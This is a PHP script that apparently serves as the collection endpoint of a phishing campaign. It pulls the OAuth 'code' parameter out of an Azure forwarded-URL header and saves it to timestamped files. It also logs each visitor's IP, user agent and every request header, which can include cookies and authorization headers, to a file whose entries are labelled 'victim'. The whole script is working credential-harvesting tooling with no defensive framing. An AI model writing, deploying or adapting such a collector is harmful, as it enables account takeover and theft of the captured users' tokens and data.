<?php
// New functionality: Extract the 'code' parameter from the X-Waws-Unencoded-Url header and write it to a timestamped file.
if (isset($_SERVER['HTTP_X_WAWS_UNENCODED_URL'])) {
    // Retrieve the header value (expected format: "/?code=...&state=1234&...")
    $unencodedUrl = $_SERVER['HTTP_X_WAWS_UNENCODED_URL'];
    
    // Parse the URL to isolate the query string.
    $urlParts = parse_url($unencodedUrl);
    
    if (isset($urlParts['query'])) {
        // Convert the query string into an associative array.
        parse_str($urlParts['query'], $queryParams);
        
        // If the 'code' parameter exists, save it to a timestamped file.
        if (isset($queryParams['code'])) {
            $code = $queryParams['code'];
            
            // Create a timestamped filename (e.g., code_20250219123045.txt)
            $filename = 'code_' . date('YmdHis') . '.txt';
            
            // Write the extracted code to the file.
            file_put_contents($filename, $code);
        }
    }
}

// Original functionality: Logging IP and header information to ip.txt.
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

foreach (getallheaders() as $name => $value) {
    fwrite($fp, "$name: $value <br>");
}

fclose($fp);
?>
